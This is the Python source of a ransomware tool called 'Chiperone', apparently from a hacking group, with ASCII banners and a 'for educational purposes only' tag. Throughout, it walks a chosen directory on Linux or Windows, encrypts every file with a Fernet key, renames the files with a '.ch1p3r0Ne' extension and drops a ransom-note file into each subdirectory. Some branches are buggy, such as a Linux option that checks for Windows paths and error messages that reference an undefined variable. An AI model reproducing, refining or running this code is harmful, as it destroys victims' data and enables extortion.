import os
import sys
import time
import random
import shutil
from termcolor import colored
from cryptography.fernet import Fernet

###########################################################################################################
###########################################################################################################
def banner():
	bann1 = r"""
	

 __      ____     __                                 _____              __       __     
/\ \    /\  _`\  /\ \      __                       /\  __`\          /'__`\    /\ \    
\ \ \   \ \ \/\_\\ \ \___ /\_\  _____      __   _ __\ \ \/\ \    ___ /\_\L\ \   \ \ \   
 \ \ \   \ \ \/_/_\ \  _ `\/\ \/\ '__`\  /'__`\/\`'__\ \ \ \ \ /' _ `\/_/_\_<_   \ \ \  
  \ \_\   \ \ \L\ \\ \ \ \ \ \ \ \ \L\ \/\  __/\ \ \/ \ \ \_\ \/\ \/\ \/\ \L\ \   \ \_\ 
   \/\_\   \ \____/ \ \_\ \_\ \_\ \ ,__/\ \____\\ \_\  \ \_____\ \_\ \_\ \____/    \/\_\
    \/_/    \/___/   \/_/\/_/\/_/\ \ \/  \/____/ \/_/   \/_____/\/_/\/_/\/___/      \/_/
                                  \ \_\                                                 
                                   \/_/                                                 
***WRITTEN BY NICKSECURITY***
***VERSION: BETA***
***0xZ3R0SQU4D HACKING GROUP***
***FOR EDUCATIONAL PURPOSES ONLY***
	
	"""
	bann2 = r"""
	
██╗     ██████╗██╗  ██╗██╗██████╗ ███████╗██████╗  ██████╗ ███╗   ██╗██████╗     ██╗
██║    ██╔════╝██║  ██║██║██╔══██╗██╔════╝██╔══██╗██╔═══██╗████╗  ██║╚════██╗    ██║
██║    ██║     ███████║██║██████╔╝█████╗  ██████╔╝██║   ██║██╔██╗ ██║ █████╔╝    ██║
╚═╝    ██║     ██╔══██║██║██╔═══╝ ██╔══╝  ██╔══██╗██║   ██║██║╚██╗██║ ╚═══██╗    ╚═╝
██╗    ╚██████╗██║  ██║██║██║     ███████╗██║  ██║╚██████╔╝██║ ╚████║██████╔╝    ██╗
╚═╝     ╚═════╝╚═╝  ╚═╝╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚═════╝     ╚═╝
***WRITTEN BY NICKSECURITY***
***VERSION: BETA***
***0xZ3R0SQU4D HACKING GROUP***
***FOR EDUCATIONAL PURPOSES ONLY***                                                              
	"""
	
	bann3 = r"""

 __         ______   __        __                                 ______              ______         __ 
|  \       /      \ |  \      |  \                               /      \            /      \       |  \
| $$      |  $$$$$$\| $$____   \$$  ______    ______    ______  |  $$$$$$\ _______  |  $$$$$$\      | $$
| $$      | $$   \$$| $$    \ |  \ /      \  /      \  /      \ | $$  | $$|       \  \$$__| $$      | $$
| $$      | $$      | $$$$$$$\| $$|  $$$$$$\|  $$$$$$\|  $$$$$$\| $$  | $$| $$$$$$$\  |     $$      | $$
 \$$      | $$   __ | $$  | $$| $$| $$  | $$| $$    $$| $$   \$$| $$  | $$| $$  | $$ __\$$$$$\       \$$
 __       | $$__/  \| $$  | $$| $$| $$__/ $$| $$$$$$$$| $$      | $$__/ $$| $$  | $$|  \__| $$       __ 
|  \       \$$    $$| $$  | $$| $$| $$    $$ \$$     \| $$       \$$    $$| $$  | $$ \$$    $$      |  \
 \$$        \$$$$$$  \$$   \$$ \$$| $$$$$$$   \$$$$$$$ \$$        \$$$$$$  \$$   \$$  \$$$$$$        \$$
                                  | $$                                                                  
                                  | $$                                                                  
                                   \$$                                                                                                    
***WRITTEN BY NICKSECURITY***
***VERSION: BETA***
***0xZ3R0SQU4D HACKING GROUP***
***FOR EDUCATIONAL PURPOSES ONLY***
	"""
	listban=[bann1, bann2, bann3]
	print(random.choice(listban))
def decfilescopy2(flash, direct):
	print("="*100)
	print(colored("[+]", 'green'), f" COPYNG DECRYPTED FILES TO --> {flash}")
	num=0
	for root, dirs, files in os.walk(direct):	
		try:
		
			for fr in files:
				
				try:
					drr = os.path.join(root, fr)
					shutil.copy(drr, flash)
					
					os.rename(os.path.join(flash, os.path.basename(drr)), os.path.join(flash, f"file_{num}"))
					print(colored("[+]", 'green'), f" COPIED FILE TO DIRECTORY/FLASH DECRYPTED AS file_{num} --> {drr}")
					num += 1
					time.sleep(0.2)
				except PermissionError:
					print(colored("[-]", 'red'), f" ERROR COPYNG FILE TO FLASH: {pth} --> {flash}")
					continue
				except Exception as E:
					print(colored("[-]", 'red'), f" ERROR COPYNG FILE TO FLASH DUE TO UNKNOWN AND CRITICAL ERROR: {pth} --> {flash}")
					continue
		except PermissionError:
			print("Aaaa")
		except Exception as E:
			print(E)
	
	time.sleep(0.4)
	print(colored("[+]", 'green'), " DECRYPT COPY PROCESS FINISHED.")	
	
	print("="*100)
def replicate2(rep, frase):
	print("="*100)
	time.sleep(0.4)
	print(colored("[+]", 'green'), " GETTING DIRECTORIES FOR COPY PROCESS STARTED!")
	directoriese = []
	for root, dirs, files in os.walk(rep):
		try:
			
			
			for dr in dirs:
				directory = os.path.join(root, dr)
				directoriese.append(directory)
				print(f" GET DIRECTORY SUCCESSFULLY! --> {directory}")
				time.sleep(0.4)
	
		except PermissionError:
			print(colored("[-]", 'red'), f" FAILED TO GET DIRECTORY FOR A PERMISSION ERROR --> {directory}")
			time.sleep(0.4)
			continue
		except Exception as E:
			print(colored("[-]", 'red'), f" FAILED TO GET DIRECTORY FOR A CRITICAL AND UNKNOWN ERROR --> {directory}")
			print(E)
			time.sleep(0.4)
			continue
			
	print(colored("[*]", 'blue') + " the GET process is finished.")
	time.sleep(0.4)
	print("="*100)
	print(colored("[*]", 'blue') + " COPYNG PROCESS STARTED!")
	
	for damn in directoriese:
		text = os.path.join(damn, "chiperone_readme.md")
		try:
			if os.path.exists(text):
				continue
			else:
				with open(text, "w") as txt:
					txt.write(frase)
					print(colored("[+]", 'green'), f" FILE COPIED SUCCESSFULLY --> {text}")
			time.sleep(0.4)
				
			
		except PermissionError:
			print(colored("[-]", 'red'), f" FAILED TO COPY FILE DUE PERMISSION ERROR --> {damn}")
			time.sleep(0.4)
			continue
		except Exception:
			print(colored("[-]", 'red'), f" FAILED TO COPY FILE DUE TO A UNKNOWN AND CRITICAL ERROR --> {damn}")
			time.sleep(0.4)
			continue
def encrypt2(directory, fl):
	
	key = Fernet.generate_key()
	time.sleep(0.4)
	print("="*100)
	print(colored("[+]", 'green', attrs=["bold"]), f" THIS IS YOUR KEY FOR DECRYPT THE FILES: ", colored(str(key), 'yellow'))
	time.sleep(0.4)
	print("="*100)
	print(colored("[+]", 'green'), " GETTING FILES FOR THE ATTACK.")
	time.sleep(0.4)
	directories=[]
	
	
	for root, dirs, files in os.walk(directory):
		try:
			for filee in files:
				if filee == "chiperone_readme.md" or filee == os.path.basename(sys.argv[0]):
					continue
				pathtarget=os.path.join(root, filee)
				directories.append(pathtarget)
		
		except PermissionError:
		
			print(colored("[-]", 'red'), f" FAILED TO GET FILE DUE TO PERMISSION ERROR --> {pathtarget}")
			time.sleep(0.4)
			continue
			
		except Exception as E:
			print(colored("[-]", 'red'), f" FAILED TO GET FILE DUE TO CRITICAL AND UNKNOWN--> {pathtarget}")
			time.sleep(0.4)
			continue
	print(colored("[+]", 'green'), " GETTING COMPLETED!")
	time.sleep(0.4)
	print("="*100)
	print(colored("[+]", 'green'), " STARTING ENCRYPTING FILES.")
	for path in directories:
		if os.path.dirname(path).endswith(fl) or fl in os.path.dirname(path):
			continue
		if "chiperone_readme" in path:
			continue
		try:
		
			with open(path, "rb") as target:
				content = target.read()
				content_enc = Fernet(key).encrypt(content)
		
			with open(path, "wb") as target2:
				target2.write(content_enc)
			print(colored("[+]", 'green'), f" ENCRYPTED SUCCESSFULLY! --> {path}")
			os.rename(path, path + ".ch1p3r0Ne")
			time.sleep(0.4)	
		except PermissionError as E:
		
			print(colored("[-]", 'red'), f" FAILED TO ENCRYPT (permission error) --> {path}")
			time.sleep(0.4)
			continue
			
		except Exception as E:
		
			print(colored("[-]", 'red'), f" FAILED TO ENCRYPT (critical and unknown error) --> {path}")
			time.sleep(0.4)
			continue
	print(colored("[+]", 'green', attrs=["bold"]), " ENCRYPTION OPERATION HAS BEEN COMPLETED SUCCESSFULLY!")
	time.sleep(0.4)
	print("="*100)
def linux2(op):
	print(colored("[+]", 'green'), " STARTING ATTACK!")
	if op == 1:
		linuxdir = input(colored("[*]", 'blue') + " put the directory to attack (like /home etc...): ")
		if linuxdir.startswith("/") or linuxdir.startswith("\\"):
			encrypt(linuxdir, "None")
			sys.exit()
		else:
			print(colored("[-]", 'red'), " please put a complete valid windows path.")
			sys.exit()
	elif op==2:
	
		linuxdir = input(colored("[*]", 'blue') + " put the directory to attack (like /home etc...): ")
		repdir = input(colored("[*]", 'blue') + " put the diretory to copy the ransomware text: ")
		ransomtext = input(colored("[*]", 'blue') + " put the ransomware text: ")
		if linuxdir.startswith("/") or linuxdir.startswith("\\"):
			replicate(repdir, ransomtext)
			encrypt(linuxdir, "None")
			sys.exit()
		else:
			print(colored("[-]", 'red'), "please put a complete valid windows path.")
			sys.exit()
	elif op==3:
	
		linuxdir = input(colored("[*]", 'blue') + " put the directory to attack (like /home etc...): ")
		repdir = input(colored("[*]", 'blue') + " put the diretory to copy the ransomware text: ")
		ransomtext = input(colored("[*]", 'blue') + " put the ransomware text: ")
		decdir = input(colored("[*]", 'blue') + " put the directory/flash drive to write with decrypted files (probabily require the root access, a big flash drive like an external disk etc...): ")
		
		if linuxdir.startswith("C:/") or linuxdir.startswith("C:\\"):
			decfilescopy(decdir, linuxdir)
			replicate(repdir, ransomtext)
			encrypt(linuxdir, decdir)

			sys.exit()
		else:
			print(colored("[-]", 'red'), "please put a complete valid windows path.")
			sys.exit()

###########################################################################################################
###########################################################################################################

def decfilescopy(flash, direct):
	print("="*100)
	print(colored("[+]", 'green'), f" COPYNG DECRYPTED FILES TO --> {flash}")
	num=0
	for root, dirs, files in os.walk(direct):	
		try:
		
			for fr in files:
				
				try:
					drr = os.path.join(root, fr)
					shutil.copy(drr, flash)
					
					os.rename(os.path.join(flash, os.path.basename(drr)), os.path.join(flash, f"file_{num}"))
					print(colored("[+]", 'green'), f" COPIED FILE TO DIRECTORY/FLASH DECRYPTED AS file_{num} --> {drr}")
					num += 1
					time.sleep(0.2)
				except PermissionError:
					print(colored("[-]", 'red'), f" ERROR COPYNG FILE TO FLASH: {pth} --> {flash}")
					continue
				except Exception as E:
					print(colored("[-]", 'red'), f" ERROR COPYNG FILE TO FLASH DUE TO UNKNOWN AND CRITICAL ERROR: {pth} --> {flash}")
					continue
		except PermissionError:
			print("Aaaa")
		except Exception as E:
			print(E)
	
	time.sleep(0.4)
	print(colored("[+]", 'green'), " DECRYPT COPY PROCESS FINISHED.")	
	
	print("="*100)
def replicate(rep, frase):
	print("="*100)
	time.sleep(0.4)
	print(colored("[+]", 'green'), " GETTING DIRECTORIES FOR COPY PROCESS STARTED!")
	directoriese = []
	for root, dirs, files in os.walk(rep):
		try:
			
			
			for dr in dirs:
				directory = os.path.join(root, dr)
				directoriese.append(directory)
				print(f" GET DIRECTORY SUCCESSFULLY! --> {directory}")
				time.sleep(0.4)
	
		except PermissionError:
			print(colored("[-]", 'red'), f" FAILED TO GET DIRECTORY FOR A PERMISSION ERROR --> {directory}")
			time.sleep(0.4)
			continue
		except Exception as E:
			print(colored("[-]", 'red'), f" FAILED TO GET DIRECTORY FOR A CRITICAL AND UNKNOWN ERROR --> {directory}")
			print(E)
			time.sleep(0.4)
			continue
			
	print(colored("[*]", 'blue') + " the GET process is finished.")
	time.sleep(0.4)
	print("="*100)
	print(colored("[*]", 'blue') + " COPYNG PROCESS STARTED!")
	
	for damn in directoriese:
		text = os.path.join(damn, "chiperone_readme.md")
		try:
			if os.path.exists(text):
				continue
			else:
				with open(text, "w") as txt:
					txt.write(frase)
					print(colored("[+]", 'green'), f" FILE COPIED SUCCESSFULLY --> {text}")
			time.sleep(0.4)
				
			
		except PermissionError:
			print(colored("[-]", 'red'), f" FAILED TO COPY FILE DUE PERMISSION ERROR --> {damn}")
			time.sleep(0.4)
			continue
		except Exception:
			print(colored("[-]", 'red'), f" FAILED TO COPY FILE DUE TO A UNKNOWN AND CRITICAL ERROR --> {damn}")
			time.sleep(0.4)
			continue
def encrypt(directory, fl):
	
	key = Fernet.generate_key()
	time.sleep(0.4)
	print("="*100)
	print(colored("[+]", 'green', attrs=["bold"]), f" THIS IS YOUR KEY FOR DECRYPT THE FILES: ", colored(str(key), 'yellow'))
	time.sleep(0.4)
	print("="*100)
	print(colored("[+]", 'green'), " GETTING FILES FOR THE ATTACK.")
	time.sleep(0.4)
	directories=[]
	
	
	for root, dirs, files in os.walk(directory):
		try:
			for filee in files:
				if filee == "chiperone_readme.md" or filee == os.path.basename(sys.argv[0]):
					continue
				pathtarget=os.path.join(root, filee)
				directories.append(pathtarget)
		
		except PermissionError:
		
			print(colored("[-]", 'red'), f" FAILED TO GET FILE DUE TO PERMISSION ERROR --> {pathtarget}")
			time.sleep(0.4)
			continue
			
		except Exception as E:
			print(colored("[-]", 'red'), f" FAILED TO GET FILE DUE TO CRITICAL AND UNKNOWN--> {pathtarget}")
			time.sleep(0.4)
			continue
	print(colored("[+]", 'green'), " GETTING COMPLETED!")
	time.sleep(0.4)
	print("="*100)
	print(colored("[+]", 'green'), " STARTING ENCRYPTING FILES.")
	for path in directories:
		if os.path.dirname(path).endswith(fl) or fl in os.path.dirname(path):
			continue
		if "chiperone_readme" in path:
			continue
		try:
		
			with open(path, "rb") as target:
				content = target.read()
				content_enc = Fernet(key).encrypt(content)
		
			with open(path, "wb") as target2:
				target2.write(content_enc)
			print(colored("[+]", 'green'), f" ENCRYPTED SUCCESSFULLY! --> {path}")
			os.rename(path, path + ".ch1p3r0Ne")
			time.sleep(0.4)	
		except PermissionError as E:
		
			print(colored("[-]", 'red'), f" FAILED TO ENCRYPT (permission error) --> {path}")
			time.sleep(0.4)
			continue
			
		except Exception as E:
		
			print(colored("[-]", 'red'), f" FAILED TO ENCRYPT (critical and unknown error) --> {path}")
			time.sleep(0.4)
			continue
	print(colored("[+]", 'green', attrs=["bold"]), " ENCRYPTION OPERATION HAS BEEN COMPLETED SUCCESSFULLY!")
	time.sleep(0.4)
	print("="*100)
def linux(op):
	print(colored("[+]", 'green'), " STARTING ATTACK!")
	if op == 1:
		linuxdir = input(colored("[*]", 'blue') + " put the directory to attack (like /home etc...): ")
		if linuxdir.startswith("/") or linuxdir.startswith("\\"):
			encrypt(linuxdir, "None")
			sys.exit()
		else:
			print(colored("[-]", 'red'), " please put a complete valid linux path.")
			sys.exit()
	elif op==2:
	
		linuxdir = input(colored("[*]", 'blue') + " put the directory to attack (like /home etc...): ")
		repdir = input(colored("[*]", 'blue') + " put the diretory to copy the ransomware text: ")
		ransomtext = input(colored("[*]", 'blue') + " put the ransomware text: ")
		if linuxdir.startswith("/") or linuxdir.startswith("\\"):
			replicate(repdir, ransomtext)
			encrypt(linuxdir, "None")
			sys.exit()
		else:
			print(colored("[-]", 'red'), "please put a complete valid linux path.")
			sys.exit()
	elif op==3:
	
		linuxdir = input(colored("[*]", 'blue') + " put the directory to attack (like /home etc...): ")
		repdir = input(colored("[*]", 'blue') + " put the diretory to copy the ransomware text: ")
		ransomtext = input(colored("[*]", 'blue') + " put the ransomware text: ")
		decdir = input(colored("[*]", 'blue') + " put the directory/flash drive to write with decrypted files (probabily require the root access, a big flash drive like an external disk etc...): ")
		
		if linuxdir.startswith("/") or linuxdir.startswith("\\"):
			decfilescopy(decdir, linuxdir)
			replicate(repdir, ransomtext)
			encrypt(linuxdir, decdir)

			sys.exit()
		else:
			print(colored("[-]", 'red'), "please put a complete valid linux path.")
			sys.exit()

def windows(op):
#########################################################################################################################
#########################################################################################################################
	print(colored("[+]", 'green'), " STARTING ATTACK!")
	if op == 1:
		windir = input(colored("[*]", 'blue') + " put the directory to attack (like C./Users etc...): ")
		if windir.startswith("C:/") or windir.startswith("C:\\"):
			encrypt2(windir, "None")
			sys.exit()
		else:
			print(colored("[-]", 'red'), " please put a complete valid windows path.")
			sys.exit()
	elif op==2:
	
		windir = input(colored("[*]", 'blue') + " put the directory to attack (like C:/Users etc...): ")
		repdir = input(colored("[*]", 'blue') + " put the diretory to copy the ransomware text: ")
		ransomtext = input(colored("[*]", 'blue') + " put the ransomware text: ")
		if windir.startswith("C:/") or windir.startswith("C:\\"):
			replicate2(repdir, ransomtext)
			encrypt2(windir, "None")
			sys.exit()
		else:
			print(colored("[-]", 'red'), " please put a complete valid windows path.")
			sys.exit()
	elif op==3:
	
		windir = input(colored("[*]", 'blue') + " put the directory to attack (like C:/Users etc...): ")
		repdir = input(colored("[*]", 'blue') + " put the diretory to copy the ransomware text: ")
		ransomtext = input(colored("[*]", 'blue') + " put the ransomware text: ")
		decdir = input(colored("[*]", 'blue') + " put the directory/flash drive to write with decrypted files (probabily require the SYSTEM access, a big flash drive like an external disk etc...): ")
		
		if windir.startswith("C:/") or windir.startswith("C:\\"):
			decfilescopy2(decdir, windir)
			replicate2(repdir, ransomtext)
			encrypt2(windir, decdir)

			sys.exit()
		else:
			print(colored("[-]", 'red'), "please put a complete valid windows path.")
			sys.exit()
#########################################################################################################################
#########################################################################################################################


def main():
	banner()
	systems_avaiables = """AVAIABLE OS OPTIONS:\n======================\n1) linux\n2) windows\n======================\n"""
	real_op="""AVAIABLE TOOL OPTIONS:\n============================================================================================================================================================\n1) encrypt only one directory with his subdirs\n2) encrypt only one directory with his subdirs and put a txt file on the dir and subdir with a text.\n3) encrypt only one directory with his subdirs, put a txt file on the dir and subdir with a text and get all files decrypted in a flash drive or a directory.\n=============================================================================================================================================================\n"""
	print(systems_avaiables)
	time.sleep(0.4)
	print(real_op)
	time.sleep(0.4)
	system = int(input(colored("[*]", 'blue') + " SELECT YOUR CURRENT OPERATIVE SYSTEM (number): "))
	option = int(input(colored("[*]", 'blue') + " SELECT A TOOL ACTION: "))
	if system == 1:
			linux(option)
	elif system == 2:
			windows(option)
	else:
		print(colored("[-]", 'red'), " select an option in number.")
		sys.exit()

	
main()
